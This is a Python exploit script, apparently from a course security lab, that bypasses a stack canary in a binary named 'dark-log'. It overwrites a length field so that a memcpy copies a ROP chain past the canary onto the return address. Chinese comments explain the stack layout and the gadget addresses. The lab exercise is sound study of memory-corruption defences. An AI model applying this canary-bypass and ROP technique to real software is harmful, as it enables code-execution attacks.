#!/usr/bin/env python3
# ============================================================
# Lab3 Task 4 —— 绕过 Stack Protector(Canary)
# 用法(attack/ 目录): python3 payload_canary.py | ./dark-log
#
# 原理:
#   input() 栈布局(低->高, 由反汇编实测):
#     expression[128] @ rbp-0x120
#     logMsg[128]     @ rbp-0xA0    (lea -0x120(%rbp)+0x80)
#     len(4)+pad(8)   @ rbp-0x20
#     canary          @ rbp-0x8     ← 直接溢出必覆盖它,触发 __stack_chk_fail
#     saved rbp @ rbp+0 / retaddr @ rbp+8
#   gets 输入 260 字节恰好写到 len 字段为止(canary 一个字节都不碰)。
#   再把 len 从 0 改成 0xA0,让函数里那句
#     memcpy(f.logMsg + f.len, f.expression, 128)
#   的落点 = rbp-0xA0+0xA0 = rbp+0(saved rbp) —— 完全跳过 canary,
#   把 expression 开头的 ROP 链整体"搬运"到 saved rbp / retaddr 区域。
# ============================================================
import sys

P = lambda a: a.to_bytes(8, "little")
POP_RDI_RET = 0x4018A3   # pop %rdi; ret
RET_JUNK    = 0x4018B1   # ret(用于把 %rsp 对齐回 16 字节)
GRADE_EVAL  = 0x401677   # grade_eval(4) -> "Hope A will be your grade!"

# 搬运后: dst+0(saved rbp 处)吃掉第一个 qword, dst+8(返回地址)吃掉第二个。
chain  = P(0)            # [-> saved rbp] 占位,值无所谓
chain += P(POP_RDI_RET)  # [-> retaddr] 返回地址 -> pop %rdi; ret
chain += P(4)            #   %rdi = 4
chain += P(RET_JUNK)     #   %rsp 恢复 16B 对齐(printf 里 movaps 需要)
chain += P(GRADE_EVAL)   #   rip -> grade_eval; 打印成功, fflush 落盘
expr   = chain + b"B" * (128 - len(chain))
payload = expr + b"C" * 128 + (0xA0).to_bytes(4, "little")
assert len(payload) == 260 and b"\x0a" not in payload
sys.stdout.buffer.write(payload)
